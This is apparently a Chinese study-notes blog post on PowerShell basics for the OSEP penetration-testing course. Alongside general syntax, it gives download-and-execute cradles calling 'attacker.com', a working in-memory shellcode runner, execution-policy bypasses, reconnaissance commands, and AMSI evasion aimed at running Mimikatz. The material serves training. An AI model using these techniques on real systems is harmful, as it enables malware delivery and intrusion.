---
title: OSEP-01-PowerShell基础
description: '01-前置知识 | 03-PowerShell基础'
pubDate: 2026-01-29T10:00:00+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - PowerShell
  - Windows Learning
  - Exploit Development
  - Privilege Escalation
  - Reverse Engineering
  - Windows
  - Competition
  - Persistence
---

# PowerShell 基础 
## 为什么 PowerShell 对 OSEP 如此重要？
PowerShell 是 OSEP 课程的**核心技能**，原因如下：

1. **无文件攻击**：PowerShell 可以完全在内存中执行代码
2. **绑定 .NET**：可以调用任何 .NET 类库，包括 Win32 API
3. **默认安装**：Windows 7+ 默认安装，无需额外工具
4. **强大的功能**：可以执行几乎所有系统管理任务
5. **绕过检测**：比传统可执行文件更难被检测

---

## 一、PowerShell 基础语法
### 1.1 变量
```powershell
# 变量以 $ 开头
$name = "hacker"
$age = 25
$isAdmin = $true

# 查看变量类型
$name.GetType()

# 特殊变量
$null          # 空值
$true / $false # 布尔值
$_             # 管道中的当前对象
$args          # 脚本参数
$env:PATH      # 环境变量
$PWD           # 当前目录
$HOME          # 用户主目录
```

### 1.2 数据类型
```powershell
# 字符串
$str = "Hello World"
$str = 'Hello World'  # 单引号不解析变量
$str = "Hello $name"  # 双引号解析变量

# 数组
$arr = @(1, 2, 3, 4, 5)
$arr = 1..10           # 范围操作符
$arr[0]                # 第一个元素
$arr[-1]               # 最后一个元素
$arr[1..3]             # 切片

# 哈希表 (类似 Python 字典)
$hash = @{
    Name = "Alice"
    Age = 25
    City = "Beijing"
}
$hash["Name"]          # 访问值
$hash.Name             # 点号访问

# 字节数组 (shellcode 常用)
[byte[]]$bytes = 0x90, 0x90, 0x90
$bytes = [byte[]](0x90, 0x90, 0x90)
```

### 1.3 运算符
```powershell
# 算术运算符
$a + $b    # 加
$a - $b    # 减
$a * $b    # 乘
$a / $b    # 除
$a % $b    # 取模

# 比较运算符 (注意：不是 ==, !=)
$a -eq $b  # 等于 (equal)
$a -ne $b  # 不等于 (not equal)
$a -gt $b  # 大于 (greater than)
$a -lt $b  # 小于 (less than)
$a -ge $b  # 大于等于
$a -le $b  # 小于等于

# 字符串比较
$str -like "*.txt"     # 通配符匹配
$str -match "regex"    # 正则匹配
$str -contains "sub"   # 包含

# 逻辑运算符
$a -and $b
$a -or $b
-not $a
!$a
```

### 1.4 控制流
```powershell
# if-else
if ($age -gt 18) {
    Write-Host "Adult"
} elseif ($age -gt 12) {
    Write-Host "Teen"
} else {
    Write-Host "Child"
}

# switch
switch ($day) {
    "Monday" { "Start of week" }
    "Friday" { "End of week" }
    default { "Middle of week" }
}

# for 循环
for ($i = 0; $i -lt 10; $i++) {
    Write-Host $i
}

# foreach 循环
foreach ($item in $collection) {
    Write-Host $item
}

# while 循环
while ($condition) {
    # 循环体
}

# do-while
do {
    # 循环体
} while ($condition)
```

### 1.5 函数
```powershell
# 基本函数
function Say-Hello {
    Write-Host "Hello!"
}

# 带参数的函数
function Add-Numbers {
    param(
        [int]$a,
        [int]$b
    )
    return $a + $b
}

# 调用函数
Say-Hello
$result = Add-Numbers -a 5 -b 3

# 高级函数 (带验证)
function Get-UserInfo {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Username,

        [Parameter()]
        [ValidateSet("Admin", "User", "Guest")]
        [string]$Role = "User"
    )

    # 函数体
}
```

---

## 二、PowerShell 管道
### 2.1 管道基础
```powershell
# 管道将一个命令的输出传递给下一个命令
Get-Process | Where-Object { $_.CPU -gt 100 } | Sort-Object CPU -Descending

# $_ 代表管道中的当前对象
Get-Service | Where-Object { $_.Status -eq "Running" }

# 简写形式
Get-Service | ? { $_.Status -eq "Running" }  # ? = Where-Object
Get-Process | % { $_.Name }                   # % = ForEach-Object
```

### 2.2 常用管道命令
```powershell
# Where-Object - 过滤
Get-Process | Where-Object { $_.Name -like "*chrome*" }

# Select-Object - 选择属性
Get-Process | Select-Object Name, CPU, Memory

# Sort-Object - 排序
Get-Process | Sort-Object CPU -Descending

# ForEach-Object - 遍历
1..10 | ForEach-Object { $_ * 2 }

# Measure-Object - 统计
Get-Process | Measure-Object -Property CPU -Sum -Average

# Group-Object - 分组
Get-Process | Group-Object -Property Company

# Out-File - 输出到文件
Get-Process | Out-File processes.txt

# Export-Csv - 导出 CSV
Get-Process | Export-Csv processes.csv
```

---

## 三、.NET 集成
### 3.1 使用 .NET 类
```powershell
# 创建 .NET 对象
$webclient = New-Object System.Net.WebClient
$content = $webclient.DownloadString("http://example.com")

# 静态方法调用
[System.IO.File]::ReadAllText("C:\file.txt")
[System.Convert]::ToBase64String($bytes)
[System.Text.Encoding]::UTF8.GetString($bytes)

# 类型转换
[int]"123"
[byte[]]$data = 0x41, 0x42, 0x43
[System.IntPtr]$ptr = 0x12345678
```

### 3.2 常用 .NET 类
```powershell
# 网络请求
$wc = New-Object System.Net.WebClient
$wc.DownloadString("http://example.com")
$wc.DownloadFile("http://example.com/file.exe", "C:\file.exe")
$wc.UploadString("http://example.com", "POST", "data")

# 文件操作
[System.IO.File]::ReadAllBytes("C:\file.bin")
[System.IO.File]::WriteAllBytes("C:\file.bin", $bytes)
[System.IO.File]::ReadAllText("C:\file.txt")

# 编码转换
[System.Convert]::ToBase64String($bytes)
[System.Convert]::FromBase64String($base64)
[System.Text.Encoding]::UTF8.GetBytes("Hello")
[System.Text.Encoding]::UTF8.GetString($bytes)

# 反射
[System.Reflection.Assembly]::LoadFile("C:\assembly.dll")
[System.Reflection.Assembly]::Load($bytes)
```

---

## 四、Win32 API 调用
### 4.1 使用 Add-Type
```powershell
# 定义 C# 代码调用 Win32 API
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    [DllImport("user32.dll")]
    public static extern int MessageBox(
        IntPtr hWnd,
        string lpText,
        string lpCaption,
        uint uType
    );
}
"@

# 编译并加载
Add-Type -TypeDefinition $code

# 调用 API
[Win32]::MessageBox([IntPtr]::Zero, "Hello", "Title", 0)
```

### 4.2 使用反射 (无需编译)
```powershell
# 获取 UnsafeNativeMethods 类
$systemAssembly = [System.Reflection.Assembly]::LoadWithPartialName("System")
$unsafeType = $systemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods")

# 获取方法
$getModuleHandle = $unsafeType.GetMethod("GetModuleHandle")
$getProcAddress = $unsafeType.GetMethod("GetProcAddress",
    [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

# 调用方法
$kernel32 = $getModuleHandle.Invoke($null, @("kernel32.dll"))
```

---

## 五、OSEP 常用技术
### 5.1 下载并执行
```powershell
# 方法1: IEX (Invoke-Expression)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# 方法2: 使用变量
$code = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
Invoke-Expression $code

# 方法3: 使用 Invoke-WebRequest (PowerShell 3.0+)
IEX (Invoke-WebRequest -Uri 'http://attacker.com/script.ps1' -UseBasicParsing).Content

# 方法4: 下载到内存并执行 (字节)
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker.com/payload.exe')
[System.Reflection.Assembly]::Load($bytes)
```

### 5.2 Base64 编码执行
```powershell
# 编码命令
$command = "Write-Host 'Hello World'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [System.Convert]::ToBase64String($bytes)

# 执行编码命令
powershell -EncodedCommand $encoded

# 或者
powershell -e $encoded
powershell -enc $encoded
```

### 5.3 绕过执行策略
```powershell
# 查看当前执行策略
Get-ExecutionPolicy

# 绕过方法
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -file script.ps1

# 其他绕过方法
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# 通过管道绕过
Get-Content script.ps1 | PowerShell -NoProfile -

# 通过下载绕过
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### 5.4 Shellcode 执行器
```powershell
# 简单的 Shellcode 执行器
function Invoke-Shellcode {
    param(
        [byte[]]$Shellcode
    )

    # 定义 Win32 API
    $code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

    Add-Type -TypeDefinition $code

    # 分配内存
    $size = $Shellcode.Length
    $addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)

    # 复制 shellcode
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $addr, $size)

    # 创建线程执行
    $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    [Win32]::WaitForSingleObject($thread, 0xFFFFFFFF)
}

# 使用示例
[byte[]]$shellcode = 0xfc, 0x48, 0x83, 0xe4, 0xf0, ...
Invoke-Shellcode -Shellcode $shellcode
```

---

## 六、信息收集
### 6.1 系统信息
```powershell
# 系统信息
Get-ComputerInfo
systeminfo

# 操作系统版本
[System.Environment]::OSVersion
$PSVersionTable

# 当前用户
whoami
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# 是否管理员
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# 环境变量
Get-ChildItem Env:
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
```

### 6.2 网络信息
```powershell
# 网络配置
Get-NetIPConfiguration
ipconfig /all

# 网络连接
Get-NetTCPConnection
netstat -ano

# DNS 缓存
Get-DnsClientCache
ipconfig /displaydns

# ARP 表
Get-NetNeighbor
arp -a

# 路由表
Get-NetRoute
route print
```

### 6.3 进程和服务
```powershell
# 进程列表
Get-Process
Get-Process | Select-Object Name, Id, Path

# 服务列表
Get-Service
Get-Service | Where-Object { $_.Status -eq "Running" }

# 计划任务
Get-ScheduledTask
schtasks /query

# 启动项
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### 6.4 用户和组
```powershell
# 本地用户
Get-LocalUser
net user

# 本地组
Get-LocalGroup
net localgroup

# 组成员
Get-LocalGroupMember -Group "Administrators"
net localgroup administrators

# 域用户 (需要 AD 模块)
Get-ADUser -Filter *
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Domain Admins"
```

---

## 七、文件操作
### 7.1 基本操作
```powershell
# 读取文件
Get-Content file.txt
[System.IO.File]::ReadAllText("file.txt")
[System.IO.File]::ReadAllBytes("file.bin")

# 写入文件
Set-Content file.txt "content"
Add-Content file.txt "append"
[System.IO.File]::WriteAllText("file.txt", "content")
[System.IO.File]::WriteAllBytes("file.bin", $bytes)

# 复制/移动/删除
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt

# 创建目录
New-Item -ItemType Directory -Path "C:\NewFolder"
mkdir "C:\NewFolder"
```

### 7.2 搜索文件
```powershell
# 搜索文件
Get-ChildItem -Path C:\ -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue

# 搜索包含特定内容的文件
Get-ChildItem -Recurse | Select-String -Pattern "password"

# 查找大文件
Get-ChildItem -Recurse | Where-Object { $_.Length -gt 100MB }

# 查找最近修改的文件
Get-ChildItem -Recurse | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }
```

---

## 八、远程执行
### 8.1 PowerShell Remoting
```powershell
# 启用 PS Remoting
Enable-PSRemoting -Force

# 远程执行命令
Invoke-Command -ComputerName Server01 -ScriptBlock { Get-Process }

# 交互式远程会话
Enter-PSSession -ComputerName Server01

# 使用凭据
$cred = Get-Credential
Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock { whoami }

# 多台机器
Invoke-Command -ComputerName Server01, Server02 -ScriptBlock { hostname }
```

### 8.2 WMI/CIM
```powershell
# 使用 WMI
Get-WmiObject -Class Win32_Process
Get-WmiObject -Class Win32_Service
Get-WmiObject -Class Win32_OperatingSystem

# 远程 WMI
Get-WmiObject -Class Win32_Process -ComputerName Server01

# 使用 CIM (推荐)
Get-CimInstance -ClassName Win32_Process
Get-CimInstance -ClassName Win32_Service

# 执行命令 (通过 WMI)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe"
```

---

## 九、AMSI 和安全机制
### 9.1 AMSI 简介
AMSI (Antimalware Scan Interface) 是 Windows 10 引入的安全机制，用于扫描脚本内容。

```powershell
# AMSI 会扫描以下内容:
# - PowerShell 脚本
# - VBScript/JScript
# - Office VBA 宏
# - .NET 程序集加载

# 触发 AMSI 检测的示例
Invoke-Mimikatz  # 会被检测
```

### 9.2 常见绕过技术 (教育目的)
```powershell
# 方法1: 字符串混淆
$a = 'Invoke-'
$b = 'Mimikatz'
& ($a + $b)

# 方法2: Base64 编码
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Invoke-Mimikatz'))
IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))

# 方法3: 反射 (课程会详细讲解)
# 通过反射修改 AMSI 相关变量或函数
```

---

## 十、章节测试
### 选择题
1. PowerShell 中比较两个值是否相等使用哪个运算符？
    - A) ==
    - B) -eq
    - C) .equals()
    - D) =
2. 以下哪个命令可以绕过执行策略？
    - A) powershell -ExecutionPolicy Bypass
    - B) powershell -NoPolicy
    - C) powershell -SkipPolicy
    - D) powershell -IgnorePolicy
3. 在管道中，`$_` 代表什么？
    - A) 上一个命令的返回值
    - B) 当前管道对象
    - C) 空值
    - D) 错误对象
4. 下载并执行远程脚本的命令是？
    - A) Download-Script
    - B) Get-RemoteScript
    - C) IEX (New-Object Net.WebClient).DownloadString(...)
    - D) Import-RemoteModule
5. PowerShell 中定义字节数组的正确语法是？
    - A) byte[] $arr = {0x90, 0x90}
    - B) [byte[]]$arr = 0x90, 0x90
    - C) $arr = new byte[]{0x90, 0x90}
    - D) $arr = @byte(0x90, 0x90)

### 实践题
1. 编写一个 PowerShell 脚本，获取所有正在运行的服务名称。
2. 编写一个函数，接受一个 URL 参数，下载内容并返回。
3. 使用 Add-Type 定义一个调用 MessageBox 的类，并弹出一个消息框。

### 答案
**选择题**：1-B, 2-A, 3-B, 4-C, 5-B

**实践题参考答案**：

```powershell
# 1. 获取运行中的服务
Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object -ExpandProperty Name

# 2. 下载函数
function Get-WebContent {
    param([string]$Url)
    return (New-Object Net.WebClient).DownloadString($Url)
}

# 3. MessageBox
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class MsgBox {
    [DllImport("user32.dll")]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
}
"@
[MsgBox]::MessageBox([IntPtr]::Zero, "Hello", "Title", 0)
```

---

## 十一、延伸阅读
+ [PowerShell 官方文档](https://docs.microsoft.com/en-us/powershell/)
+ [PowerShell Gallery](https://www.powershellgallery.com/)
+ [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
+ [Nishang](https://github.com/samratashok/nishang)

---

**下一章**：后续章节发布后，这里会补上可直接跳转的文章链接。
